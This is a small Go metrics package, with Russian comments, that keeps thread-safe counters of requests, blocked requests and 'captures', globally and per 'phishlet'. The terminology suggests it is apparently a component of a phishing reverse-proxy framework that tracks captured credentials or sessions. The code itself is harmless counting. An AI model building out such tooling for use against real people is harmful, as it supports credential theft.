// Package metrics — минимальные счетчики без внешних deps.
// Глобальные + per-phishlet labels.
package metrics

import (
	"sync"
	"sync/atomic"
)

var requests, blocked, captures atomic.Int64

var (
	mu  sync.RWMutex
	byP = map[string]*atomic.Int64{}
)

func IncRequests() { requests.Add(1) }
func IncBlocked()  { blocked.Add(1) }
func IncCapture()  { captures.Add(1) }

func Snapshot() (req, blk, cap int64) {
	return requests.Load(), blocked.Load(), captures.Load()
}

func IncRequestsFor(phishlet string) {
	if phishlet == "" {
		return
	}
	mu.RLock()
	c, ok := byP[phishlet]
	mu.RUnlock()
	if !ok {
		mu.Lock()
		c, ok = byP[phishlet]
		if !ok {
			c = &atomic.Int64{}
			byP[phishlet] = c
		}
		mu.Unlock()
	}
	c.Add(1)
	requests.Add(1)
}

func ByPhishlet(phishlet string) int64 {
	mu.RLock()
	defer mu.RUnlock()
	if c, ok := byP[phishlet]; ok {
		return c.Load()
	}
	return 0
}
